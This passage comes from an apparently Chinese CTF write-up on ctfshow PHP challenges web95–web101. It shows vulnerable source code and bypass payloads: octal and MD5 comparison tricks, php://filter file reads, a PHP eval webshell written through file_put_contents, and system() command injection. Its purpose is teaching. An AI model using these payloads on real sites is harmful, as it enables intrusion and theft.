function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[a-z]|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// ç‚¹åŒ¹é…æ²¡äº†</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token number">4476</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ©ç”¨å…«è¿›åˆ¶å¼€å¤´åŠ å·ä»£æ›¿ç©ºæ ¼ç»•è¿‡?num=+010574</p><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no no no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'u'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>paylaod:</p><pre><code>./flag.php/var/www/html/flag.phpphp://filter/resource=flag.php</code></pre><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token keyword">print</span> <span class="token string">'Wrong.'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>md5å¼±ç±»å‹æ¯”è¾ƒå¯ä»¥ç›´æ¥æ•°ç»„ç»•è¿‡ï¼Œå…¶ç»“æœéƒ½ä¼šè½¬æ¢ä¸ºnull</p><pre><code>a[]=1&amp;b[]=2</code></pre><p>å¦‚æœè¿›è¡Œäº†stringå¼ºåˆ¶è½¬ç±»å‹åï¼Œåˆ™ä¸å†æ¥å—æ•°ç»„</p><p>å¼±ç¢°æ’ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>  <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!==</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span>md5å¼±æ¯”è¾ƒï¼Œä¸º0eå¼€å¤´çš„ä¼šè¢«è¯†åˆ«ä¸ºç§‘å­¦è®°æ•°æ³•ï¼Œç»“æœå‡ä¸º<span class="token number">0</span>ï¼Œæ‰€ä»¥åªéœ€æ‰¾ä¸¤ä¸ªmd5åéƒ½ä¸º0eå¼€å¤´ä¸”0eåé¢å‡ä¸ºæ•°å­—çš„å€¼å³å¯ã€‚payload<span class="token punctuation">:</span> a<span class="token operator">=</span><span class="token constant">QNKCDZO</span><span class="token operator">&amp;</span>b<span class="token operator">=</span><span class="token number">240610708</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¼ºç¢°æ’ï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$a</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$b</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>  <span class="token punctuation">(</span><span class="token variable">$a</span><span class="token operator">!==</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span>è¿™æ—¶å€™éœ€è¦æ‰¾åˆ°ä¸¤ä¸ªçœŸæ­£çš„md5å€¼ç›¸åŒæ•°æ®a<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">0E</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">5C</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token constant">B2</span><span class="token operator">%</span><span class="token constant">1B</span><span class="token operator">%</span><span class="token constant">DCV</span><span class="token operator">%</span><span class="token constant">B7J</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span>C0x<span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">BF</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token number">00</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">28K</span><span class="token operator">%</span>F3n<span class="token operator">%</span><span class="token constant">8EKU</span><span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">D1U</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token constant">FB_</span><span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">&amp;</span>b<span class="token operator">=</span>M<span class="token operator">%</span>C9h<span class="token operator">%</span><span class="token constant">FF</span><span class="token operator">%</span><span class="token constant">0E</span><span class="token operator">%</span><span class="token constant">E3</span><span class="token operator">%</span><span class="token constant">5C</span><span class="token operator">%</span><span class="token number">20</span><span class="token operator">%</span>95r<span class="token operator">%</span>D4w<span class="token operator">%</span>7Br<span class="token operator">%</span><span class="token number">15</span><span class="token operator">%</span><span class="token number">87</span><span class="token operator">%</span>D3o<span class="token operator">%</span><span class="token constant">A7</span><span class="token operator">%</span><span class="token constant">B2</span><span class="token operator">%</span><span class="token constant">1B</span><span class="token operator">%</span><span class="token constant">DCV</span><span class="token operator">%</span><span class="token constant">B7J</span><span class="token operator">%</span><span class="token constant">3D</span><span class="token operator">%</span>C0x<span class="token operator">%</span><span class="token constant">3E</span><span class="token operator">%</span><span class="token constant">7B</span><span class="token operator">%</span><span class="token number">95</span><span class="token operator">%</span><span class="token number">18</span><span class="token operator">%</span><span class="token constant">AF</span><span class="token operator">%</span><span class="token constant">BF</span><span class="token operator">%</span><span class="token constant">A2</span><span class="token operator">%</span><span class="token number">02</span><span class="token operator">%</span><span class="token constant">A8</span><span class="token operator">%</span><span class="token constant">28K</span><span class="token operator">%</span>F3n<span class="token operator">%</span><span class="token constant">8EKU</span><span class="token operator">%</span>B3_Bu<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span>D8Igm<span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token constant">D1</span><span class="token operator">%</span><span class="token constant">D5</span><span class="token operator">%</span><span class="token constant">5D</span><span class="token operator">%</span><span class="token number">83</span><span class="token operator">%</span><span class="token number">60</span><span class="token operator">%</span><span class="token constant">FB_</span><span class="token operator">%</span><span class="token number">07</span><span class="token operator">%</span><span class="token constant">FE</span><span class="token operator">%</span><span class="token constant">A2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_COOKIE</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'flag'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_SERVER</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.php.cn/php-weizijiaocheng-383293.html" target="_blank" rel="noopener">phpä¸‰å…ƒè¿ç®—ç¬¦ä¸ifçš„è¯¦è§£</a></p><p><a href="https://www.php.cn/php-notebook-172859.html" target="_blank" rel="noopener">phpå‡½æ•°çš„ä¼ å€¼ä¸ä¼ å€(å¼•ç”¨)è¯¦è§£</a></p><p>ä¸¾ä¾‹åˆ†æï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_GET</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">:</span><span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$_GET</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$_POST</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token string">'flag'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸‹é¢çš„ä¹Ÿæ˜¯åŒç†</p><p>ç›´åˆ°æœ€åä¸€å¥</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token operator">?</span><span class="token variable">$flag</span><span class="token punctuation">:</span><span class="token constant">__FILE__</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">===</span><span class="token operator">==</span><span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'HTTP_FLAG'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>    <span class="token constant">__FILE__</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ—¢ç„¶getä¼ å…¥çš„å€¼ä¼šè¢«å®šä½æŒ‡å‘åˆ°postæ‰€å¯¹åº”çš„å€¼ï¼Œé‚£ä¹ˆåªéœ€è¦æœ‰getå­˜åœ¨å³å¯ï¼ŒåŒæ—¶postä¼ å…¥HTTP_FLAG=flagå°±å¯ä»¥äº†</p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$allow</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">36</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x36d</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token function">array_push</span><span class="token punctuation">(</span><span class="token variable">$allow</span><span class="token punctuation">,</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allow</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'n'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.runoob.com/php/func-array-push.html" target="_blank" rel="noopener">array_push() å‡½æ•°</a>ï¼šå‘æ•°ç»„å°¾éƒ¨æ’å…¥ä¸€ä¸ªæˆ–å¤šä¸ªå…ƒç´ </p><p><a href="https://www.runoob.com/php/func-math-rand.html" target="_blank" rel="noopener">rand() å‡½æ•°</a>éšæœºç”Ÿæˆæ•°ç»„rand(min,max)</p><p><a href="https://www.runoob.com/php/func-filesystem-file-put-contents.html" target="_blank" rel="noopener">file_put_contents() å‡½æ•°</a>ï¼šå†™å…¥å‡½æ•°</p><p>payloadï¼š</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">?</span>n<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">.</span>phpcontent<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> @<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'hack'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>content<span class="token operator">=</span><span class="token delimiter">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">'cat flag36d.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\;/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$v2('ctfshow')$v3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://www.jb51.net/article/42425.htm" target="_blank" rel="noopener">phpä¸­ORä¸|| ANDä¸&amp;&amp;çš„åŒºåˆ«æ€»ç»“</a></p><p>å› ä¸ºèµ‹å€¼çš„ä¼˜å…ˆçº§(=)é«˜äºandæ‰€ä»¥$v0çš„å€¼å¯ä»¥ç”±$v1æ¥æ§åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç»™å…¶èµ‹å€¼ä¸º1ä¹Ÿå°±æ˜¯true</p><p>å› ä¸ºflagåœ¨ç±»ctfshowä¸­ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥å‘½ä»¤æ‰§è¡Œ</p><pre><code>?v1=1&amp;v2=var_dump($ctfshow)&amp;v3=;v1=1&amp;v2=system(&quot;cat ctfshow.php&quot;)/*&amp;v3=*/;</code></pre><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string">"ctfshow.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//flag in class ctfshow;</span><span class="token variable">$ctfshow</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$v1</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v2</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v3</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'v3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$v0</span><span class="token operator">=</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v2</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$v0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/"</span><span class="token punctuation">,</span> <span class="token variable">$v3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"$v2('ctfshow')$v3"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œç‰µæ‰¯åˆ°çš„æ˜¯ä¸€ä¸ªåå°„ç±»çš„é—®é¢˜</p><p><a href="https://ask.dcloud.net.cn/article/631" target="_blank" rel="noopener">phpåå°„ç±» ReflectionClassä½¿ç”¨ä¾‹å­</a></p><p><a href="https://www.huaweicloud.com/articles/12460007.html" target="_blank" rel="noopener">PHPçš„åå°„ç±»ReflectionClassã€ReflectionMethodä½¿ç”¨å®ä¾‹</a></p><p><a href="https://learnku.com/articles/7538/the-application-of-reflection-in-php" target="_blank" rel="noopener">åå°„åœ¨ PHP ä¸­çš„åº”ç”¨</a></p><p>çœ‹äº†åŠå¤©ï¼Œå¤§æ¦‚çŸ¥é“äº†</p><p>åå°„ç±»å¯ä»¥è¯´æˆæ˜¯ç±»çš„ä¸€ä¸ªæ˜ å°„ï¼Œå¯ä»¥åˆ©ç”¨åå°„ç±»æ¥ä»£æ›¿æœ‰å…³ç±»çš„åº”ç”¨çš„ä»»ä½•è¯­å¥</p><p>å…¶å±æ€§ä¸ºç±»çš„ä¸€ä¸ªåç§°ï¼Œè¿™é“é¢˜ç›®é‡Œé¢ç±»çš„åç§°ä¸ºctfshow</p><p><strong>payloadï¼š</strong><code>?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</code></p><p><strong>ä¸¾ä¸ªä¾‹å­</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token 